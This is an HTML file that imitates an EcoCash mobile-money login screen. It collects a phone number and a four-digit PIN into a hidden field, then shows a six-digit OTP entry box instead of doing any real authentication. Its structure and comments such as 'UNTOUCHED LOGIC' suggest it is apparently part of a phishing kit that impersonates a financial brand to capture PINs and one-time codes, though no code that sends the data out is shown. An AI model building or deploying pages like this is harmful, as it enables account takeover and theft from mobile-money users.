<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}

.card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
label{display:block;font-size:13px;color:#374151;margin-top:8px}

input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
.btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
.btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}

.req{color:#d04444;margin-right:6px}

/* PIN BOXES */
.pin-row{
  display:flex;
  justify-content:center;
  gap:10px;
  margin-top:6px;
}
.pin-box{
  width:44px;
  height:48px;
  text-align:center;
  font-size:22px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff;
}
</style>
</head>

<body>
<div class="card">
  <img src="assets/eco.png" alt="EcoCash logo" class="logo">

  <!-- TEXT FIX -->
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="7" inputmode="numeric" maxlength="9" placeholder="7XXXXXXXX">

    <label><span class="req">★</span>4-Digit PIN</label>

    <!-- visible PIN boxes -->
    <div class="pin-row">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
    </div>

    <!-- hidden PIN input (DO NOT REMOVE) -->
    <input type="hidden" id="pin" name="pin">

    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL — UNTOUCHED -->
<div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
  <div class="otp-box">
    <strong style="display:block;text-align:center">Enter OTP</strong>
    <div class="otp-row">
      <input maxlength="1" class="otp-digit" id="d0">
      <input maxlength="1" class="otp-digit" id="d1">
      <input maxlength="1" class="otp-digit" id="d2">
      <input maxlength="1" class="otp-digit" id="d3">
      <input maxlength="1" class="otp-digit" id="d4">
      <input maxlength="1" class="otp-digit" id="d5">
    </div>
  </div>
</div>

<script>
/* ================= PHONE ================= */
const phoneEl = document.getElementById('phone');

phoneEl.addEventListener('input',()=>{
  let v = phoneEl.value.replace(/\D/g,'');
  if(v && v[0]!=='7') v='7'+v.slice(1);
  phoneEl.value = v.slice(0,9);
  updateLoginState();
});

/* ================= PIN ================= */
const pinBoxes = [...document.querySelectorAll('.pin-box')];
const pinHidden = document.getElementById('pin');

function syncPin(){
  const val = pinBoxes.map(b=>b.dataset.v||'').join('');
  pinHidden.value = val;
  updateLoginState();
}

pinBoxes.forEach((box,i)=>{
  box.addEventListener('input',e=>{
    const v=e.target.value.replace(/\D/g,'');
    box.value = v ? '•' : '';
    box.dataset.v = v;
    if(v && i<3) pinBoxes[i+1].focus();
    syncPin();
  });

  box.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !box.dataset.v && i>0){
      e.preventDefault();
      pinBoxes[i-1].value='';
      pinBoxes[i-1].dataset.v='';
      pinBoxes[i-1].focus();
      syncPin();
    }
  });
});

/* ================= STATE ================= */
const loginBtn = document.getElementById('loginBtn');
function updateLoginState(){
  loginBtn.disabled = !(phoneEl.value.length===9 && /^\d{4}$/.test(pinHidden.value));
}

/* ================= SUBMIT (UNTOUCHED LOGIC) ================= */
document.getElementById('loginForm').addEventListener('submit',function(e){
  e.preventDefault();
  document.getElementById('otpModal').style.display='flex';
});
</script>
</body>
</html>
